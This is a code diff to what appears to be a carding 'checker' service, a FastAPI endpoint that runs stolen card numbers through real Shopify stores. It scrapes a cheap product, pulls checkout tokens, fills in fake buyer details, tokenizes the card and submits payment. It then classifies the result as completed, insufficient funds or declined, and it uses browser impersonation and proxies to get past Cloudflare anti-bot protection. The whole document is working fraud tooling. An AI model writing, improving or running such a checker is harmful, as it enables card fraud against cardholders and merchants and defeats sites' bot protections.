@@ -4,7 +4,6 @@ from curl_cffi.requests import AsyncSession
 import re
 import json
 import random
-import urllib.parse
 
 app = FastAPI()
 
@@ -19,9 +18,9 @@ def format_proxy(proxy_str):
         return f"http://{ip}:{port}"
     return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"
 
-def extract_token_deep(html_text):
+def extract_token_ultimate(html_text):
     """
-    الرادار النووي: يبحث في HTML و JSON و React State المخفية
+    الرادار الشامل والنهائي: يبحث في الـ HTML، الـ JSON State، والروابط
     """
     patterns = [
         r'name="authenticity_token"\s*value="([^"]+)"',
@@ -29,8 +28,8 @@ def extract_token_deep(html_text):
         r'<meta\s+name="csrf-token"\s*content="([^"]+)"',
         r'"authenticity_token"\s*:\s*"([^"]+)"',
         r'authenticity_token\\u0022:\\u0022([^\\]+)\\u0022',
-        r'\\u0026authenticity_token=([^&"\'\\]+)',
-        r'token":"([a-zA-Z0-9_-]{32,})"' # اصطياد التوكن من نظام React الجديد
+        r'token":"([a-f0-9]{32,})"', # JSON state token
+        r'checkout_token":"([^"]+)"'
     ]
     for p in patterns:
         match = re.search(p, html_text)
@@ -51,7 +50,6 @@ def extract_gateway(html_text):
 
 async def get_cheapest_product(session, store_url):
     try:
-        # استخدام هيدر متصفح حقيقي لتجنب حظر السحب
         headers = {"Accept": "application/json"}
         res = await session.get(f"{store_url}/products.json?limit=250", headers=headers)
         if res.status_code != 200: return None, None
@@ -85,35 +83,53 @@ async def check_shopify(cc_info, store_url, proxy):
         formatted_proxy = format_proxy(proxy)
         proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None
 
-        # استخدام بصمة متصفح Safari لتقليل استهداف Cloudflare للبوتات
-        async with AsyncSession(impersonate="safari15_3", proxies=proxies, timeout=60) as session:
+        # استخدام متصفح Chrome حديث لتخطي Cloudflare بسلاسة
+        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60) as session:
             
-            # 1. سحب أرخص منتج
+            # 1. سحب المنتج
             variant_id, price = await get_cheapest_product(session, store_url)
             if not variant_id:
-                return {"Response": "No active products found", "Price": "-", "Gate": "Shopify API"}
+                return {"Response": "No active products found or Site Dead", "Price": "-", "Gate": "Shopify API"}
 
-            # 2. الثغرة (Direct Checkout Permalink) لإنشاء جلسة دفع وتخطي السلة
-            checkout_url = f"{store_url}/cart/{variant_id}:1"
-            res2 = await session.get(checkout_url, allow_redirects=True)
-            html2 = res2.text
-            current_url = str(res2.url)
+            # 2. الإضافة للسلة بالطريقة الشرعية وتخطي الكاش
+            add_url = f"{store_url}/cart/add.js?t={int(time.time() * 1000)}"
+            add_data = {"id": str(variant_id), "quantity": "1"}
+            add_headers = {
+                "Accept": "application/json",
+                "X-Requested-With": "XMLHttpRequest"
+            }
+            res2 = await session.post(add_url, data=add_data, headers=add_headers)
+            if res2.status_code != 200: 
+                return {"Response": "Cart Add Failed (Cloudflare/Anti-Bot Blocked)", "Price": f"${price}", "Gate": "Shopify API"}
+
+            # 3. جلب رابط الدفع الحقيقي من السلة
+            cart_res = await session.get(f"{store_url}/cart.js")
+            checkout_final_url = f"{store_url}/checkout"
             
-            auth_token = extract_token_deep(html2)
+            # 4. الدخول لصفحة الدفع وسحب الـ Token
+            res3 = await session.get(checkout_final_url, allow_redirects=True)
+            checkout_html = res3.text
+            checkout_final_url = str(res3.url) # تحديث الرابط في حال تم إعادة التوجيه
+            
+            auth_token = extract_token_ultimate(checkout_html)
 
-            # فحص حماية Cloudflare بشكل دقيق
+            # إذا لم نجد التوكن، هذا يعني أننا في صفحة (Contact Info) أو (Cloudflare)
             if not auth_token:
-                title_match = re.search(r'<title>([^<]+)</title>', html2)
+                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                 page_title = title_match.group(1).strip() if title_match else "Unknown"
                 
-                if "Just a moment" in page_title or "Cloudflare" in page_title or res2.status_code in [403, 429]:
-                    return {"Response": f"Cloudflare/Datadome Blocked Proxy IP", "Price": f"${price}", "Gate": "Shopify API"}
+                if "Just a moment" in page_title or "Cloudflare" in page_title:
+                    return {"Response": "Cloudflare Challenge Blocked Proxy IP", "Price": f"${price}", "Gate": "Shopify API"}
                 
-                # إذا لم يجد توكن، سيقوم البوت بإرجاع اسم الصفحة لتعرف أين وقف بالضبط
-                return {"Response": f"Token Not Found (Page: {page_title[:20]})", "Price": f"${price}", "Gate": "Shopify API"}
+                # المحاولة الأخيرة: سحب التوكن من الـ Meta
+                meta_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', checkout_html)
+                if meta_match:
+                    auth_token = meta_match.group(1)
+                else:
+                    return {"Response": f"Token Not Found (Protected/Custom UI: {page_title[:15]})", "Price": f"${price}", "Gate": "Shopify API"}
 
-            # 3. محاكاة تعبئة عنوان الشحن (خطوة إجبارية في التحديث الجديد)
-            email = f"johndoe{random.randint(10000,99999)}@gmail.com"
+            # 5. تعبئة العنوان والشحن (ضروري لفتح بوابة الدفع)
+            email = f"john.doe{random.randint(1000,9999)}@gmail.com"
             address_payload = {
                 "_method": "patch",
                 "authenticity_token": auth_token,
@@ -130,13 +146,13 @@ async def check_shopify(cc_info, store_url, proxy):
                 "checkout[shipping_address][phone]": "(212) 555-1234",
                 "button": ""
             }
-            res3 = await session.post(current_url, data=address_payload, allow_redirects=True)
-            html3 = res3.text
-            current_url = str(res3.url)
+            res4 = await session.post(checkout_final_url, data=address_payload, allow_redirects=True)
+            html4 = res4.text
+            checkout_final_url = str(res4.url)
 
-            auth_token2 = extract_token_deep(html3) or auth_token
+            auth_token2 = extract_token_ultimate(html4) or auth_token
 
-            # 4. تخطي الشحن للوصول للبوابة
+            # تخطي الشحن
             shipping_payload = {
                 "_method": "patch",
                 "authenticity_token": auth_token2,
@@ -144,29 +160,25 @@ async def check_shopify(cc_info, store_url, proxy):
                 "step": "payment_method",
                 "button": ""
             }
-            res4 = await session.post(current_url, data=shipping_payload, allow_redirects=True)
-            html4 = res4.text
-            current_url = str(res4.url)
+            res5 = await session.post(checkout_final_url, data=shipping_payload, allow_redirects=True)
+            html5 = res5.text
+            checkout_final_url = str(res5.url)
 
-            auth_token3 = extract_token_deep(html4) or auth_token2
-            gateway_id = extract_gateway(html4)
+            auth_token3 = extract_token_ultimate(html5) or auth_token2
+            gateway_id = extract_gateway(html5)
 
-            # 5. تشفير البطاقة داخل سيرفرات الدفع (Stripe/Shopify)
+            # 6. تشفير البطاقة
             token_url = "https://deposit.us.shopifycs.com/sessions"
             token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
-            token_headers = {
-                "Accept": "application/json", 
-                "Content-Type": "application/json",
-                "Origin": "https://checkout.shopifycs.com"
-            }
+            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
             
-            res5 = await session.post(token_url, json=token_payload, headers=token_headers)
-            if res5.status_code != 200: 
-                return {"Response": "Failed to tokenize card (Shopify Banned Proxy)", "Price": f"${price}", "Gate": "Shopify API"}
+            res6 = await session.post(token_url, json=token_payload, headers=token_headers)
+            if res6.status_code != 200: 
+                return {"Response": "Failed to tokenize card (Proxy IP Banned by Shopify)", "Price": f"${price}", "Gate": "Shopify API"}
             
-            payment_token = res5.json().get("id")
+            payment_token = res6.json().get("id")
 
-            # 6. الهجوم النهائي (إرسال الدفع)
+            # 7. إرسال الدفع
             payment_payload = {
                 "_method": "patch",
                 "authenticity_token": auth_token3,
@@ -179,11 +191,11 @@ async def check_shopify(cc_info, store_url, proxy):
                 "complete": "1"
             }
             
-            res6 = await session.post(current_url, data=payment_payload, allow_redirects=True)
-            result_html = res6.text.lower()
+            res7 = await session.post(checkout_final_url, data=payment_payload, allow_redirects=True)
+            result_html = res7.text.lower()
             
-            # 7. قراءة الرد بدقة متناهية
-            if "thank you" in result_html or "order completed" in result_html or res6.url.endswith('/thank_you'):
+            # 8. قراءة الرد
+            if "thank you" in result_html or "order completed" in result_html or res7.url.endswith('/thank_you'):
                 return {"Response": "Order completed 💎", "Price": f"${price}", "Gate": "Shopify API"}
             elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                 return {"Response": "Insufficient Funds", "Price": f"${price}", "Gate": "Shopify API"}
@@ -194,9 +206,14 @@ async def check_shopify(cc_info, store_url, proxy):
             elif "do not honor" in result_html or "generic_decline" in result_html: 
                 return {"Response": "Do Not Honor", "Price": f"${price}", "Gate": "Shopify API"}
             else:
-                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res6.text)
+                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res7.text)
                 if error_match: return {"Response": error_match.group(1).strip(), "Price": f"${price}", "Gate": "Shopify API"}
-                return {"Response": "Declined / Custom Gate Error", "Price": f"${price}", "Gate": "Shopify API"}
+                
+                # إذا لم نجد رسالة خطأ صريحة
+                if "payment" in result_html and "error" in result_html:
+                     return {"Response": "Generic Payment Error", "Price": f"${price}", "Gate": "Shopify API"}
+                     
+                return {"Response": "Declined / Custom Error", "Price": f"${price}", "Gate": "Shopify API"}
 
     except Exception as e:
         err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out")
